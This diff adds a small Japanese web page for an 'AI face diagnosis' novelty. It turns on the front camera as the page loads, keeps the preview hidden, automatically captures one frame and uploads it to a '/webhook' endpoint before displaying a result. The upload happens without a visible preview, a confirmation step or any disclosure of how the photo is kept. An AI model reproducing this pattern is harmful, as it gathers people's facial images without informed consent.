@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>AI顔診断</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 40px;
+    }
+    #result {
+      font-size: 1.4em;
+      margin-top: 20px;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>AIがあなたの顔を診断中...</h1>
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <p id="result">カメラを許可してください</p>
+
+  <script>
+    const video = document.getElementById("video");
+    const result = document.getElementById("result");
+
+    async function startAndCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false,
+        });
+        video.srcObject = stream;
+
+        await new Promise(resolve => setTimeout(resolve, 1500));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 320;
+        canvas.height = video.videoHeight || 240;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL("image/png");
+
+        const res = await fetch("/webhook", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ image: dataUrl }),
+        });
+
+        if (!res.ok) throw new Error("サーバーエラー");
+
+        const data = await res.json();
+        result.textContent = `診断結果：${data.result}`;
+
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = "none";
+
+      } catch (err) {
+        result.textContent = "❌ カメラの許可が必要です！";
+        console.error(err);
+      }
+    }
+
+    window.onload = startAndCapture;
+  </script>
+</body>
+</html>
